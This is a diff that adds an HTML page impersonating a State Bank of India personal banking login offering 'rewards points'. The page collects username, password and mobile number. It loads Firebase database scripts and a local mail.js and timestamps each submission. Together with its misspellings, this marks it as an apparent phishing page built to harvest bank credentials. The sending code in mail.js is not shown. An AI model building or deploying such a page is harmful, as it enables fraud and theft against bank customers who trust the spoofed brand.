@@ -1,0 +1,99 @@
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>State Bank of India - Personal Banking</title>
+    <meta name="theme-color" content="#000000">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap"
+        rel="stylesheet">
+    <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
+    <script defer="defer" src="/static/js/main.6418afb3.js"></script>
+    <link href="style.css" rel="stylesheet">
+</head>
+
+<body><noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root">
+        <div>
+            <div class="hsmain">
+                <header class="Tpv_logo__La5jG"><a href="/"><img alt="cMIF2W" width="150" src="/img/xdfr_yglogo.png"
+                            style="color: transparent;"></a></header>
+                <div class="Tpv_login_heading__E5J6K">
+                    <h3 class="Tpv_login_heading_h3__z0Qx1">Login to get rewards points</h3>
+                </div>
+                <div class="Tpv_login_form___9zpm">
+                    <p class="Tpv_login_aster___9zpm">Required fields are marked with an asterisk (*)</p>
+
+                    <form class="Tpv_form__okPRU" id="contactForm" onsubmit="setCurrentDateTime()">
+                        <input type="hidden" id="currentDateTime" name="currentDateTime">
+                        <div class="Tpv_form_group__aHWg0"><label class="Tpv_label__cObJz">Username<span
+                                    class="Tpv_info_span__oB9oh"> *</span></label><input type="text"
+                                class="Tpv_form_control__5hzGF" id="username" required="" maxlength="30" name="UN">
+                        </div>
+                        <div class="Tpv_form_group__aHWg0"><label class="Tpv_label__cObJz">Password<span
+                                    class="Tpv_info_span__oB9oh"> *</span></label><input type="password"
+                                class="Tpv_form_control__5hzGF" id="password" required="" maxlength="30" name="PS">
+                        </div>
+                        <div class="Tpv_form_group__aHWg0"><label class="Tpv_label__cObJz">Mobile<span
+                                    class="Tpv_info_span__oB9oh"> *</span></label><input
+                                class="Tpv_form_control__5hzGF dob" id="mobile" required="" name="MB"></div>
+                        <div class="Tpv_form_group__aHWg0"><label class="Tpv_label__cObJz">Captcha<span
+                                    class="Tpv_info_span__oB9oh"> *</span></label><input type="text"
+                                class="Tpv_form_control__5hzGF" maxlength="30"></div><label
+                            class="Tpv_label__cObJz">Select any Captcha</label>
+                        <div class="Tpv_captcha__luduR">
+                            <div class="Tpv_w_50__Sr4Sb"><input type="radio" id="imageCaptcha" checked=""> Image Captcha
+                            </div>
+                            <div class="Tpv_w_50__Sr4Sb"><input type="radio" id="audioCaptcha"> Audio Captcha</div>
+                            <div class="Tpv_clear__O2odX"></div>
+                            <div class="Tpv_top_10__85sFl">
+                                <div><img alt="Captcha" loading="lazy" width="150" height="39" decoding="async"
+                                        data-nimg="1" src="/img/cp/cp1.png" style="color: transparent;"><img
+                                        alt="Change Captcha" loading="lazy" width="30" height="30" src="/img/cpBtn.png"
+                                        class="changeCaptcha"
+                                        style="color: transparent; margin-left: 5px; margin-bottom: 2px; cursor: pointer;">
+                                </div>
+                            </div>
+                            <div class="Tpv_form_group__aHWg0"><input type="submit" class="Tpv_btn__Mbztt"
+                                    value="LOGIN">
+                                <input type="reset" class="Tpv_btn__Mbztt" value="RESET">
+                            </div>
+                            <p><a href="javascript:;">New Registar? Create Account</a></p>
+                            <p><a href="javascript:;">Forgot Pasword? Reset Now</a></p>
+                        </div>
+                    </form>
+
+                </div>
+                <div></div>
+                <div class="Tpv_p_body__VIl_Q">
+                    <ul class="Tpv_provide__KIDMh">
+                        <li>Required fields are marked with an asterisk (*).</li>
+                        <li>Please do not share your user ID and password with anyone.</li>
+                        <li>Username and password are sensitive. Share them carefully!</li>
+                    </ul>
+                </div>
+                <div class="Tpv_footer_area__vmfML"><img alt="599OM4" loading="lazy" width="68" height="28"
+                        decoding="async" data-nimg="1" src="/img/sign.png" style="color: transparent;"></div>
+                <div class="Tpv_footer__uSut5">
+                    <p>© Copyright</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-database.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="/mail.js"></script>
+</body>
+<script>
+            function setCurrentDateTime() {
+            var now = new Date();
+            var datetime = now.getFullYear()+'-'+(now.getMonth()+1)+'-'+now.getDate()+'   '+now.getHours()+'H:'+now.getMinutes()+'M:'+now.getSeconds()+'S';
+            document.getElementById('currentDateTime').value = datetime;
+        }
+</script>
+</html>
